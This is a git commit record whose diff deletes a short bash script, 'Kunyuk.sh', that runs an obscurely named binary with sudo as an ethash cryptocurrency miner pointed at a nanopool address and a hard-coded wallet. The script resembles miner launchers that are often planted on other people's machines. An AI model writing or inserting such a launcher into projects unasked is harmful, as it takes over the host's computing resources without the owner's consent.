0318c8f4fd6863feb2dfd7bde63e94bb94a1e7b8
justjust123 <108263005+justjust123@users.noreply.github.com>
2022-10-03 18:13:27 +0700

    Delete Kunyuk.sh

--- Kunyuk.sh
+++
@@ -1,9 +0,0 @@
-#!/bin/bash
-
-POOL=etc-eu1.nanopool.org:19999
-WALLET=0xf3ffd073e16a2c69a6343d30e1d4d4e334133b9e.$(echo $(shuf -i 1000-9999 -n 1)-MJ-)
-WORKER=$(echo $(shuf -i 1000-9999 -n 1)-MJ-)
-
-cd "$(dirname "$0")"
-
-chmod +x ./Kunyuk1 && sudo ./Kunyuk1 -a ethash -o $POOL -u $WALLET.$WORKER $@
